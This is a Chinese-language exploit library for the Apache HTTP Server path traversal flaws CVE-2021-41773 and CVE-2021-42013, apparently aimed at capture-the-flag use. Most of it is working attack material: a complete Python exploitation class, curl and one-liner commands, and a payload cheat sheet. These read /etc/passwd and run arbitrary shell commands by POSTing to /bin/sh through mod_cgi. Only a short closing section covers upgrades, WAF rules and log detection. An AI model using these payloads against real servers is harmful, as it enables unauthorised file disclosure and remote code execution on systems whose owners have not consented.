# CVE - Apache路径遍历攻击库

## 概述

Apache HTTP Server在多个版本中存在路径遍历漏洞,允许攻击者绕过路径限制访问服务器文件系统上的任意文件。最著名的是CVE-2021-41773和CVE-2021-42013,以及CVE-2021-41524(Apache 2.4.50)。当与CGI模块结合时,还可以实现远程代码执行。

**影响版本**:
- Apache 2.4.49 (CVE-2021-41773)
- Apache 2.4.50 (CVE-2021-42013 - 对41773修复不完整)

**核心威胁**: URL编码绕过 → 路径遍历 → 任意文件读取 → CGI模块RCE

## 漏洞原理

### CVE-2021-41773 & CVE-2021-42013

Apache在处理URL路径时,对`../`序列的验证不完整,攻击者可以通过URL编码绕过:

1. **正常路径**: `/var/www/html/index.html`
2. **遍历尝试**: `/../../../etc/passwd` → 被阻止
3. **编码绕过**: `/.%2e/..%2e/..%2e/etc/passwd` → 成功

**关键点**:
- `.` 的URL编码: `%2e`
- `/` 的URL编码: `%2f`
- 双重编码: `%%32%65` (对`%2e`再次编码)

### CGI模块RCE

当Apache启用CGI模块(`mod_cgi`)时,可以通过路径遍历访问`/bin/sh`,并通过POST数据注入命令:

```bash
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; cat /flag
```

## 核心攻击技术

### 1. 基本路径遍历 (.%2e编码)

**技术**: 使用`.%2e`编码绕过路径验证

```bash
# 访问/etc/passwd
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# 分解:
# .%2e  = ..  (点的编码)
# %2e%2e = .. (两个点的编码)
# /%2e%2e/ = /../
```

**应用场景**:
- 读取系统文件(/etc/passwd)
- 读取应用配置文件
- 读取FLAG文件

### 2. 双重URL编码

**技术**: 对已编码的字符再次编码绕过WAF

```bash
# 单次编码
%2e = .

# 双重编码
%%32%65 = %2e = .

# 实际使用
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
```

**应用场景**:
- 绕过WAF/IDS检测
- 绕过输入过滤

### 3. 使用不同alias目录

**技术**: 利用Apache配置的多个alias目录

```bash
# cgi-bin目录
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# icons目录
/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# 其他可能的alias
/manual/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/server-status/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 4. CGI模块命令执行

**技术**: 通过路径遍历访问/bin/sh并POST命令

```python
import urllib.request

url = "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
data = b"echo Content-Type: text/plain; echo; cat /tmp/flag"

req = urllib.request.Request(url, data=data, method='POST')
req.add_header('Content-Type', 'application/x-www-form-urlencoded')

with urllib.request.urlopen(req, timeout=10) as response:
    print(response.read().decode())
```

**关键**: 必须使用`urllib`而非`requests`,因为`requests`会对URL进行额外处理

### 5. 混合编码绕过

**技术**: 混合使用不同编码方式

```bash
# 混合正常字符和编码
/cgi-bin/..%2f..%2f..%2fetc/passwd

# 混合不同编码
/cgi-bin/.%2e/%252e%252e/..%2f/etc/passwd

# 使用反斜杠(Windows)
/cgi-bin/..%5c..%5c..%5cetc/passwd
```

## 完整攻击工具

### Apache路径遍历自动化利用类

```python
#!/usr/bin/env python3
"""
Apache路径遍历漏洞(CVE-2021-41773/CVE-2021-42013)自动化利用工具
支持文件读取和CGI RCE
"""

import requests
import urllib.request
import urllib.parse
import sys
import re

class ApachePathTraversal:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_payloads(self, file_path):
        """
        生成路径遍历payload列表
        
        Args:
            file_path: 目标文件路径
        
        Returns:
            list: payload列表
        """
        # 计算需要的../层数
        depth = file_path.count('/') + 4
        
        payloads = []
        
        # 基本.%2e编码
        traversal = '/.%2e' * depth
        payloads.append(f"/cgi-bin{traversal}{file_path}")
        payloads.append(f"/icons{traversal}{file_path}")
        
        # 使用%2e%2e
        traversal = '/%2e%2e' * depth
        payloads.append(f"/cgi-bin{traversal}{file_path}")
        
        # 混合编码
        traversal = '/..%2f' * depth
        payloads.append(f"/cgi-bin{traversal}{file_path}")
        
        # 双重编码
        traversal = '/%%32%65%%32%65' * depth
        payloads.append(f"/cgi-bin{traversal}{file_path}")
        
        # 反斜杠(可能在某些配置下有效)
        traversal = '/..%5c' * depth
        payloads.append(f"/cgi-bin{traversal}{file_path}")
        
        return payloads
    
    def test_file_read(self, file_path):
        """
        测试文件读取
        
        Args:
            file_path: 要读取的文件路径
        
        Returns:
            文件内容或None
        """
        print(f"[*] 尝试读取文件: {file_path}")
        
        payloads = self.generate_payloads(file_path)
        
        for i, payload in enumerate(payloads, 1):
            try:
                url = self.target + payload
                print(f"[{i}] 尝试: {payload[:80]}...")
                
                r = self.session.get(url, timeout=10)
                
                if r.status_code == 200 and len(r.text) > 10:
                    # 检查是否是有效内容
                    if file_path == "/etc/passwd" and "root:" in r.text:
                        print(f"[+] 成功读取! 使用payload: {payload}")
                        print(f"[+] 内容预览:\n{r.text[:300]}")
                        return r.text
                    elif "flag{" in r.text.lower():
                        print(f"[+] 发现FLAG! 使用payload: {payload}")
                        print(f"[+] 内容:\n{r.text}")
                        return r.text
                    elif len(r.text) > 20:
                        print(f"[+] 获取到内容(长度: {len(r.text)})")
                        print(f"[+] 内容:\n{r.text[:200]}")
                        return r.text
                        
            except Exception as e:
                print(f"[-] 错误: {e}")
        
        print(f"[-] 无法读取文件: {file_path}")
        return None
    
    def exploit_cgi_rce(self, command="cat /tmp/flag"):
        """
        利用CGI模块执行命令
        
        Args:
            command: 要执行的命令
        
        Returns:
            命令输出
        """
        print(f"[*] 尝试CGI RCE...")
        print(f"[*] 命令: {command}")
        
        # 构造POST数据(必须包含Content-Type输出)
        cmd_data = f"echo Content-Type: text/plain; echo; {command}".encode()
        
        # 尝试不同深度的路径遍历
        depths = [4, 5, 6, 7]
        
        for depth in depths:
            traversal = '/.%2e' * depth
            url = self.target + f"/cgi-bin{traversal}/bin/sh"
            
            print(f"[*] 尝试深度 {depth}: {url}")
            
            try:
                # 使用urllib而非requests
                req = urllib.request.Request(url, data=cmd_data, method='POST')
                req.add_header('Content-Type', 'application/x-www-form-urlencoded')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    output = response.read().decode('utf-8', errors='ignore')
                    
                    if len(output) > 5:
                        print(f"[+] 命令执行成功!")
                        print(f"[+] 输出:\n{output}")
                        return output
                        
            except Exception as e:
                print(f"[-] 深度 {depth} 失败: {e}")
        
        # 尝试使用icons目录
        print("[*] 尝试使用icons目录...")
        for depth in depths:
            traversal = '/.%2e' * depth
            url = self.target + f"/icons{traversal}/bin/sh"
            
            try:
                req = urllib.request.Request(url, data=cmd_data, method='POST')
                req.add_header('Content-Type', 'application/x-www-form-urlencoded')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    output = response.read().decode('utf-8', errors='ignore')
                    if len(output) > 5:
                        print(f"[+] 命令执行成功!")
                        print(f"[+] 输出:\n{output}")
                        return output
            except:
                pass
        
        print("[-] CGI RCE失败")
        return None
    
    def full_exploit(self):
        """
        完整利用流程
        """
        print("=" * 60)
        print("[*] Apache路径遍历漏洞完整利用")
        print("=" * 60)
        
        # 1. 验证漏洞 - 读取/etc/passwd
        print("\n[*] 步骤1: 验证漏洞(读取/etc/passwd)...")
        passwd = self.test_file_read("/etc/passwd")
        
        if passwd:
            print("[+] 路径遍历漏洞确认!")
        else:
            print("[-] 未检测到路径遍历漏洞")
            return False
        
        # 2. 读取常见FLAG位置
        print("\n[*] 步骤2: 读取常见FLAG位置...")
        flag_paths = [
            "/flag",
            "/flag.txt",
            "/FLAG.txt",
            "/tmp/flag",
            "/tmp/flag.txt",
            "/var/flag",
            "/var/www/flag",
            "/opt/flag.txt",
        ]
        
        for flag_path in flag_paths:
            result = self.test_file_read(flag_path)
            if result and "flag{" in result.lower():
                print(f"[+] 在 {flag_path} 发现FLAG!")
                return True
        
        # 3. 尝试CGI RCE
        print("\n[*] 步骤3: 尝试CGI模块RCE...")
        
        # 先找flag位置
        find_cmd = "find / -name '*flag*' 2>/dev/null | head -5"
        result = self.exploit_cgi_rce(find_cmd)
        
        if result:
            # 从find结果中提取路径
            for line in result.split('\n'):
                if 'flag' in line.lower() and line.strip():
                    print(f"[*] 发现可能的flag文件: {line.strip()}")
                    cat_result = self.exploit_cgi_rce(f"cat {line.strip()}")
                    if cat_result and "flag{" in cat_result.lower():
                        print(f"[+] 成功获取FLAG!")
                        return True
        
        # 直接尝试读取常见位置
        for path in ["/tmp/flag", "/flag", "/flag.txt"]:
            result = self.exploit_cgi_rce(f"cat {path}")
            if result and "flag{" in result.lower():
                print(f"[+] 成功获取FLAG!")
                return True
        
        return False

def exploit_apache_cve_2021_41773(target_url, file_path=None, command=None):
    """
    Apache CVE-2021-41773/42013 利用入口
    
    Args:
        target_url: 目标URL
        file_path: 要读取的文件路径(可选)
        command: 要执行的命令(可选)
    """
    print(f"[*] 目标: {target_url}")
    print()
    
    exploiter = ApachePathTraversal(target_url)
    
    if file_path:
        # 读取指定文件
        exploiter.test_file_read(file_path)
    elif command:
        # 执行指定命令
        exploiter.exploit_cgi_rce(command)
    else:
        # 完整利用
        exploiter.full_exploit()

# 快速Payload生成器
class PayloadGenerator:
    """
    Apache路径遍历Payload生成器
    """
    
    @staticmethod
    def generate(file_path, depth=4, encoding='basic'):
        """
        生成路径遍历payload
        
        Args:
            file_path: 目标文件路径
            depth: 遍历深度
            encoding: 编码类型(basic/double/mixed)
        
        Returns:
            payload字符串
        """
        if encoding == 'basic':
            # 基本.%2e编码
            traversal = '/.%2e' * depth
        elif encoding == 'double':
            # 双重编码
            traversal = '/%%32%65%%32%65' * depth
        elif encoding == 'mixed':
            # 混合编码
            traversal = '/..%2f' * depth
        else:
            traversal = '/..' * depth
        
        return f"/cgi-bin{traversal}{file_path}"
    
    @staticmethod
    def generate_cgi_rce_payload(command, depth=6):
        """
        生成CGI RCE payload
        
        Args:
            command: 命令
            depth: 遍历深度
        
        Returns:
            (url_path, post_data)
        """
        traversal = '/.%2e' * depth
        url_path = f"/cgi-bin{traversal}/bin/sh"
        post_data = f"echo Content-Type: text/plain; echo; {command}"
        
        return url_path, post_data

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url>")
        print(f"  {sys.argv[0]} <target_url> --file <file_path>")
        print(f"  {sys.argv[0]} <target_url> --cmd <command>")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target")
        print(f"  {sys.argv[0]} http://target --file /etc/passwd")
        print(f"  {sys.argv[0]} http://target --cmd 'cat /tmp/flag'")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if len(sys.argv) > 2:
        if sys.argv[2] == '--file' and len(sys.argv) > 3:
            exploit_apache_cve_2021_41773(target, file_path=sys.argv[3])
        elif sys.argv[2] == '--cmd' and len(sys.argv) > 3:
            exploit_apache_cve_2021_41773(target, command=sys.argv[3])
        else:
            exploit_apache_cve_2021_41773(target)
    else:
        exploit_apache_cve_2021_41773(target)
```

## 实战场景

### 场景1: 文件读取

**目标**: 读取`/etc/passwd`

```bash
# 使用curl
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 响应
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 场景2: FLAG读取

**目标**: 读取`/FLAG.txt`

```python
import requests

payloads = [
    "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/FLAG.txt",
    "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/FLAG.txt",
    "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/FLAG.txt",
]

for payload in payloads:
    r = requests.get(f"http://target{payload}")
    if r.status_code == 200 and "flag{" in r.text.lower():
        print(f"[+] FLAG: {r.text}")
        break
```

### 场景3: CGI RCE获取FLAG

**目标**: `/tmp/flag`

```python
import urllib.request

url = "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
data = b"echo Content-Type: text/plain; echo; cat /tmp/flag"

req = urllib.request.Request(url, data=data, method='POST')
req.add_header('Content-Type', 'application/x-www-form-urlencoded')

with urllib.request.urlopen(req) as response:
    print(response.read().decode())
```

### 场景4: 查找FLAG位置

```python
# 先执行find命令
data = b"echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"

# 然后根据结果cat文件
data = b"echo Content-Type: text/plain; echo; cat /path/to/flag"
```

## 手动测试命令

### Curl基本测试

```bash
# 1. 读取/etc/passwd验证漏洞
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 2. 读取FLAG.txt
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/FLAG.txt"

# 3. 使用icons目录
curl "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 4. 双重编码
curl "http://target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
```

### CGI RCE测试

```bash
# 使用curl执行命令(注意curl可能不work,建议用Python urllib)
curl -X POST "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "echo Content-Type: text/plain; echo; cat /tmp/flag"
```

### Python one-liner

```bash
# 文件读取
python3 -c "import requests; print(requests.get('http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd').text)"

# CGI RCE
python3 -c "import urllib.request; req=urllib.request.Request('http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', data=b'echo Content-Type: text/plain; echo; cat /tmp/flag', method='POST'); req.add_header('Content-Type', 'application/x-www-form-urlencoded'); print(urllib.request.urlopen(req).read().decode())"
```

## Payload速查表

### 文件读取Payloads

```bash
# 基本编码
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/FLAG.txt
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag

# 使用icons
/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# 双重编码
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd

# 混合编码
/cgi-bin/..%2f..%2f..%2f..%2fetc/passwd

# 不同深度
/cgi-bin/.%2e/.%2e/.%2e/FLAG.txt
/cgi-bin/.%2e/.%2e/.%2e/.%2e/FLAG.txt
```

### CGI RCE Payloads

**URL路径**:
```
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
```

**POST数据**:
```bash
echo Content-Type: text/plain; echo; cat /tmp/flag
echo Content-Type: text/plain; echo; cat /etc/passwd
echo Content-Type: text/plain; echo; id
echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null
```

## 防御措施

### 1. 立即升级Apache

```bash
# 升级到修复版本
apt-get update
apt-get install apache2
# 确保版本 >= 2.4.51
```

### 2. 临时缓解措施

在未能立即升级的情况下:

```apache
# 在httpd.conf中添加
<Directory />
    AllowOverride none
    Require all denied
</Directory>

# 禁用CGI模块
LoadModule cgi_module modules/mod_cgi.so  # 注释掉这行
```

### 3. WAF规则

```
# 检测.%2e编码
if (uri =~ /\.%2e/i) then block

# 检测双重编码
if (uri =~ /%%32%65/i) then block

# 检测路径遍历
if (uri =~ /\.\./) then block
```

### 4. 监控告警

```bash
# 监控Apache访问日志中的异常模式
grep -E '\.%2e|%%32|\.\./' /var/log/apache2/access.log
```

## 检测特征

1. **访问日志**: 包含`.%2e`, `%%32`, `/bin/sh`等特征
2. **HTTP响应**: 200状态码返回系统文件内容
3. **CGI执行**: POST请求到`/cgi-bin/`包含路径遍历
4. **异常路径**: URL中包含多层`/../`或编码变体

## 总结

Apache路径遍历漏洞是严重的安全问题,主要利用点:
- URL编码绕过路径验证(`.%2e` = `..`)
- CGI模块结合实现RCE
- 多种编码变体绕过防护

**关键攻击路径**: URL编码构造 → 路径遍历 → 文件读取/CGI访问 → RCE/敏感信息泄露

**必须使用urllib**: CGI RCE必须用`urllib.request`而非`requests`,否则URL编码会被破坏导致失败。
